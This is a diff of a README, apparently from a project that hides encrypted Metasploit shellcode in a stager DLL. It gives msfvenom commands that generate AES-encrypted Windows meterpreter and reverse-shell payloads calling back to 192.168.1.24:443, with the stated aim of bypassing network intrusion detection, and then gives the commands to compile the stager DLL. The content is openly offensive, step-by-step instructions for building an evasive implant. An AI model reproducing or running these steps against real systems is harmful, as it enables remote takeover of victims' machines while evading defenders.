@@ -5,7 +5,7 @@ Code from this article: [https://blog.rapid7.com/2018/05/03/hiding-metasploit-sh
 If you want to use the reverse_tcp_rc4 meterpreter payload (useful to bypass NIDS),  get MSF5 from official repository (master branch - no official release yet at this time for v5): [https://github.com/rapid7/metasploit-framework](https://github.com/rapid7/metasploit-framework).  
 
 Then generate payload that suits your needs, ex:  
-```ruby msfvenom -p windows/meterpreter/reverse_tcp_rc4 EXIT_FUNC=PROCESS LHOST=192.168.1.24 LPORT=443 RC4PASSWORD=GeekIsChic --encrypt aes256 --encrypt-iv E7a0eCX76F0YzS4j --encrypt-key 6ASMkFslyhwXehNZw048cF1Vh1ACzyyR -f c -o /tmp/meterpreter.c```  
+```msfvenom -p windows/meterpreter/reverse_tcp_rc4 EXIT_FUNC=PROCESS LHOST=192.168.1.24 LPORT=443 RC4PASSWORD=GeekIsChic --encrypt aes256 --encrypt-iv E7a0eCX76F0YzS4j --encrypt-key 6ASMkFslyhwXehNZw048cF1Vh1ACzyyR -f c -o /tmp/meterpreter.c```  
   
 ********************************
 ***Update 02/12/2019***:  
@@ -17,7 +17,9 @@ A solution is to use the [new MSF payloads](https://blog.rapid7.com/2019/11/21/m
 ruby msfvenom -p windows/x64/encrypted_shell_reverse_tcp LHOST=192.168.1.24 LPORT=443 --encrypt aes256 --encrypt-iv E7a0eCX76F0YzS4j --encrypt-key 6ASMkFslyhwXehNZw048cF1Vh1ACzyyR -f c -o /tmp/meterpreter.c
 ```
 ********************************
-  
+Initsiate path variables for libs
+```C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Auxiliary\Build\vcvarsall.bat" x64```
+
 Replace the payload in stager_dll_xx.cpp and build the DLL on a Windows machine with the following command:  
 ```cl /LD /MT /EHa stager_dll_xx.cpp aes.cpp /Fe:stager.dll```  
   
